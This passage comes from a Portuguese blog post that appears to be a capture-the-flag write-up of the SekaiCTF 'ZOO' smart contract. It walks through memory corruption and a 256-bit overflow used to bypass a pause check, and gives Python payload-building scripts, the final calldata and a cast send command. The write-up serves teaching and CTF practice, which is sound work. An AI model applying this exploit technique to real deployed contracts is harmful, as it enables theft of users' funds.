+ele seguiria o ponteiro e acharia que o <code>idx</code>
+desse animal é o nome que a gente escolheu.
+Como o nome não tem limite de tamanho,
+a gente consegue setar ele pra um número de 32 bytes sem problema.
+A gente só consegue controlar os 4 bytes menos significativos do <code>idx</code>,
+mas isso não é um problema,
+porque o endereço que a gente precisa escrever não é um número grande.</p><p>Abaixo é mostrado como a memória fica fazendo isso.
+Em vermelho temos o array,
+mas note que <code>animal_count</code> tem o valor 9,
+que é maior que o tamanho do array.
+Logo depois do array,
+temos o primeiro animal,
+cujo <code>idx</code> é igual ao endereço do seu nome (<code>0x320</code>).
+No nome,
+armazenamos o número que queremos que a função <code>commit</code>
+interprete como o <code>idx</code> de um animal.</p><p>Quando a função <code>commit</code> recebe esse array,
+ela vai iterando começando com o endereço do animal 0.
+Como <code>animal_count</code> é 9,
+ela então passa do array até chegar em <code>0x2e0</code>.
+A função interpreta esse número como se fosse
+o endereço do animal 8,
+que na verdade nem existe.
+Seguindo o ponteiro,
+ela chega em <code>0x2e0</code>,
+cujo valor controlamos.
+Como os primeiros 32 bytes de um animal são seu <code>idx</code>,
+a função vai achar que <code>0x320</code> na verdade
+é o <code>idx</code> do animal 8.</p><p><img alt="Memória do contrato" src=/images/ottoboni-sekai-zoo/count.png></p><p>Montar esse esquema não é tão complicado quanto parece.
+Abaixo temos uma função em Python que gera o hexa do primeiro animal.
+Aqui não tem nada de muito misterioso,
+simplesmente criamos um animal normalmente
+com os valores corretos.
+<code>idx</code> precisa ser o endereço onde o nome vai ficar
+e o nome vai ser o valor que queremos
+que o animal 8 tenha como <code>idx</code>.
+Vamos ver como chegar nesse número em breve.</p><pre tabindex=0><code>def create_evil_animal():
+    op = &#34;10&#34;
+    idx = &#34;00&#34;
+    index = &#34;0320&#34;
+    name = &#34;&lt;valor que queremos para idx&gt;&#34;
+
+    animal = op + idx + f&#34;{len(name) // 2:04x}&#34; + index + name
+    return animal
+</code></pre><p>Depois disso precisamos criar animais vazios
+pra incrementar <code>animal_count</code>.
+A seguinte função faz exatamente isso.
+Aqui criamos vários animais iguais no mesmo índice
+e com um nome vazio.
+O objetivo aqui é realmente
+só incrementar <code>animal_count</code>,
+os valores em si não importam muito.</p><pre tabindex=0><code>def create_empty_animals(n):
+    op = &#34;10&#34;
+    idx = &#34;01&#34;
+    index = &#34;eeee&#34;
+    name = &#34;&#34;
+
+    animal = op + idx + f&#34;{len(name) // 2:04x}&#34; + index + name
+    return n * animal
+</code></pre><h1 id=o-número-mágico>O número mágico</h1><p>Agora sim,
+controlamos todos os 32 bytes de <code>idx</code>.
+Pra que que servia isso mesmo?
+Ah sim,
+temos que setar o primeiro argumento do <code>sstore</code> pra 1.</p><pre tabindex=0><code>sstore(
+    add(add(slot_hash, mul(2, idx)), 1),
+    add(animal_counter, 1)
+)
+</code></pre><p>Temos que achar um número <code>idx</code> tal que
+<code>slot_hash + (2 * idx) + 1</code>
+seja <code>1</code>.
+Isso a princípio parece impossível porque
+a única solução seria <code>idx = 0</code>
+com <code>slot_hash = 0</code>,
+e a gente não controla <code>slot_hash</code>,
+ele é um número gigante full aleatório.
+Parece impossível,
+mas só até você lembrar
+que estamos no mundo dos computadores,
+especificamente na EVM,
+onde <code>2^256 = 0</code>.
+Sim, eu estou falando de overflows.
+Nós vamos transbordar <code>(2^256)-1</code>
+e fazer o número dar a volta e cair exatamente em <code>1</code>.</p><p>A conta é bem tranquila de fazer com a shell do Python.
+<code>m</code> é o maior número possível na EVM (256 bits) e
+<code>h</code> é o <code>slot_hash</code> (peguei usando o debugger).</p><pre tabindex=0><code>&gt;&gt;&gt; m = (2**256)-1
+&gt;&gt;&gt; h = int(&#34;405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace&#34;,16)
+&gt;&gt;&gt; (m-h)//2 + 1
+43344706377821576760468996987613231211325356002982170351334206299952371618457
+&gt;&gt;&gt; hex(_)
+&#39;0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299&#39;
+</code></pre><p>E assim,
+<code>43344706377821576760468996987613231211325356002982170351334206299952371618457</code>
+é o nosso número mágico
+que vai colocar <code>1</code> no primeiro argumento do <code>sstore</code>.</p><h1 id=finalizando>Finalizando</h1><p>Nosso payload final vai ser o seguinte então:</p><ol><li><code>create_evil_animal</code> - Criamos um animal cujo <code>idx</code> é o endereço do seu nome. No nome, colocamos o número mágico.</li><li><code>create_empty_animals</code> - Criamos vários animais vazios pra incrementar <code>animal_count</code>.</li><li><code>overwrite_ret</code> - Usamos a edição de nome pra sobrescrever o array <code>functions</code>, bypassando o <code>whenNotPaused</code>.</li></ol><p>O payload é longuinho e fazer tudo na mão seria tedioso,
+então eu fiz um script pra montar ele bonitinho:</p><pre tabindex=0><code>#!/usr/bin/env python3
+
+def overwrite_ret():
+    op = &#34;20&#34;
+    idx = &#34;07&#34;
+    edit = &#34;21&#34;
+    free = (30 * &#34;00&#34;) + &#34;ffff&#34;
+    ret = (30 * &#34;00&#34;) + &#34;0323&#34;
+
+    write = free + (32 * &#34;00&#34;) + (31 * &#34;00&#34; + &#34;01&#34;) + ret
+    write_len = f&#34;{len(write) // 2:04x}&#34;
+
+    payload = op + idx + edit + write_len + write
+    return payload
+
+def create_evil_animal():
+    op = &#34;10&#34;
+    idx = &#34;00&#34;
+    index = &#34;0320&#34;
+    # número mágico
+    name = &#34;5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299&#34;
+
+    animal = op + idx + f&#34;{len(name) // 2:04x}&#34; + index + name
+    return animal
+
+def create_empty_animals(n):
+    op = &#34;10&#34;
+    idx = &#34;01&#34;
+    index = &#34;eeee&#34;
+    name = &#34;&#34;
+
+    animal = op + idx + f&#34;{len(name) // 2:04x}&#34; + index + name
+    return n * animal
+
+final = create_evil_animal() + create_empty_animals(8) + overwrite_ret()
+print(final)
+</code></pre><p>Rodando esse script obtemos:</p><pre tabindex=0><code>1000002003205fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae22529910010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323
+</code></pre><p>Colocando esse valor no nosso contrato de testes,
+vemos que deu tudo certo e <code>isSolved</code> foi setado pra 1 como queríamos.</p><pre tabindex=0><code>$ forge test -vv
+
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/ZOO.t.sol:ZOOTest
+[PASS] test_bypass_pause() (gas: 458630)
+Logs:
+  Success
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.03ms (297.42µs CPU time)
+
+Ran 1 test suite in 5.17ms (1.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+</code></pre><p>Na hora de resolver o chall no CTF de verdade,
+podemos usar o <code>cast send</code> pra mandar nosso payload como calldata.</p><pre tabindex=0><code>cast send --rpc-url $rpc --private-key $private $zoo 0x1000002003205fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae22529910010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323
+</code></pre><p>Flag: <code>SEKAI{super-duper-memory-master-:3}</code></p></div></article></main><div class="authorbox clearfix"><figure class=authorbox__avatar><img alt="Gabriel Ottoboni avatar" src=/images/ottoboni.jpg class=avatar height=90 width=90></figure><div class=authorbox__header><span class=authorbox__name>Sobre Gabriel Ottoboni</span></div><div class=authorbox__description>POSIX > bash</div></div><nav class="pager flex"><div class="pager__item pager__item--prev"><a class=pager__link href=/blog/2024-08-11-tutorial-game-hacking-cheat-engine/ rel=prev><span class=pager__subtitle>«&#8201;Anterior</span><p class=pager__title>Tutorial de Game Hacking utilizando Cheat Engine</p></a></div></nav></div></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2024 Blog do GRIS.
+<span class=footer__copyright-credits>Gerado com <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> com o tema <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a>.</span></div></div></footer></div><script async defer src=/js/menu.js></script><script type=text/x-mathjax-config>
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
+      processEscapes: true,
+      processEnvironments: true
+    }
+  });
+</script><script type=text/javascript async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>
